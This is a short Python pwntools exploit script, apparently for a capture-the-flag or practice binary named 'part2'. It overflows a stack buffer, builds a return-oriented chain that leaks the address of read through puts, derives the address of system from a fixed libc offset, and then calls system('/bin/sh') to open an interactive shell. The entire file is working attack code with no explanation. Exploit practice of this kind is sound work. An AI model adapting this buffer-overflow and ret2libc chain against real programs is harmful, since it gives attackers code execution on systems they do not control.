from pwn import *

context.log_level='debug'
elf = ELF("./part2")
io = process("./part2")

main_addr = elf.sym['main']
puts_addr = elf.sym['puts']
puts_plt = elf.plt['puts']
system_plt = elf.plt['system']

read_got = elf.got['read']

print(f'main {main_addr:#x}')
print(f'puts {puts_addr:#x}')
print(f'puts {puts_plt:#x}')

# puts("/bin/sh");
pop_rdi = 0x0040119e    
binsh = 0x00402004
ret = 0x000000000040101a

gdb.attach(io, 'system')

payload = b'a'*(0xa + 8) + p64(ret) + p64(pop_rdi) + p64(read_got) + p64(puts_plt) + p64(main_addr)

io.send(payload)
io.recvuntil(b'Input: \n')
read_addr = u64(io.recv(6).ljust(8,b'\0'))
system_addr = read_addr - 0xc3310
print(f"read_addr {read_addr:#x}")


payload = b'a'*(0xa + 8)+ p64(pop_rdi) + p64(binsh) + p64(system_addr) 

io.sendafter(b"Input", payload)
'''
io.recvuntil(b"Input")
io.send(payload)
'''

io.interactive() 